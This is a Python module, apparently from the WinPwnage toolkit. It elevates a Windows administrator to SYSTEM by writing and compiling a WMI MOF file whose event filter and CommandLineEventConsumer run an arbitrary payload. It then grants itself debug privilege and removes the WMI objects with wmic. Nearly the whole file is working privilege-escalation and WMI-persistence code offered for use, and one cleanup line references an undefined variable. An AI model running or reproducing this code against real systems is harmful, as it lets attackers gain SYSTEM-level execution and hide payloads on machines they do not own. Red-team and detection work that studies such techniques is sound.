import os
import time
import datetime
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

elevate_mofcomp_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using mofcomp (non interactive)",
	"Id": "6",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevate_mofcomp",
	"Function Payload": True,
}


def elevate_mofcomp(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False
		
	if payloads().exe(payload):
		mof_template = '''#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{
	Name = "WinPwnageEventFilter";
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
	QueryLanguage = "WQL";    
	EventNamespace = "root\\\\cimv2";
};

instance of CommandLineEventConsumer as $Cons
{
	Name = "WinPwnageConsumer";
	RunInteractively=false;
	CommandLineTemplate="''' + payload.replace(os.sep, os.sep*2) + '''";
};

instance of __FilterToConsumerBinding
{
	Filter = $Filt;
	Consumer = $Cons;
};'''
		try:
			mof_file = open(os.path.join(tempfile.gettempdir(), "elevator.mof"), "w")
			mof_file.write(mof_template)
			mof_file.close()
		except Exception:
			print_error("Cannot proceed, unable to write mof file to disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))
			return False
		else:
			print_success("Successfully wrote mof template to disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(), "elevator.mof")):
			exit_code = process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(), "elevator.mof")), get_exit_code=True)
			print_info("Exit code: {}".format(str(exit_code)))
			if exit_code == 0:
				print_success("Successfully compiled mof file using mofcomp")
			else:
				print_error("Unable to compile mof file containing our payload ({})".format(payload))

			print_info("Waiting for (15) seconds for payload to get executed")	
			time.sleep(15)

			# We need to grant ourself SE_DEBUG_NAME privilege so we can parse SYSTEM processes
			hToken = HANDLE(c_void_p(-1).value)
			if OpenProcessToken(GetCurrentProcess(),(TOKEN_ALL_ACCESS | TOKEN_PRIVS),byref(hToken)) == 0:
				print_error("Error while grabbing GetCurrentProcess()'s token: {}".format(GetLastError()))

			tp = TOKEN_PRIVILEGES2()
			tp.PrivilegeCount = 1
			tp.Privileges = (20, 0, 0x00000002)

			if AdjustTokenPrivileges(hToken, False, byref(tp), 0, None, None) == 0:
				print_error("Error while assigning SE_DEBUG_NAME to GetCurrentProcess()'s token': {}".format(GetLastError()))
			else:
				pid = process().get_process_pid(os.path.split(payload)[1])
				if pid:
					print_success("Successfully elevated process PID: {}".format(pid))
				else:
					print_error("Unable to elevate payload")			

			print_info("Performing cleaning")
			try:
				os.remove(os.path.join(tempfile.gettempdir(), "elevator.mof".format(name=name)))
			except Exception:
				print_error("Unable to remove mof file from temporary directory")
			else:
				print_success("Successfully removed mof file from temporary directory")
			
			cmds = [('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="WinPwnageEventFilter" DELETE'),
				('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="WinPwnageConsumer" DELETE'),
				('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="WinPwnageEventFilter"\' DELETE'),]

			for cmd in cmds:
				exit_code = process().create("wmic.exe", params="{}".format(cmd), get_exit_code=True)
				if exit_code == 0:
					print_success("Successfully removed {event} (exit code: {code})".format(event=cmd, code=exit_code))
				else:
					print_error("Unable to removed {event} (exit code: {code})".format(event=cmd, code=exit_code))
		else:
			print_error("Unable to locate mof template on disk ({})".format(os.path.join(tempfile.gettempdir(), "elevator.mof")))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False			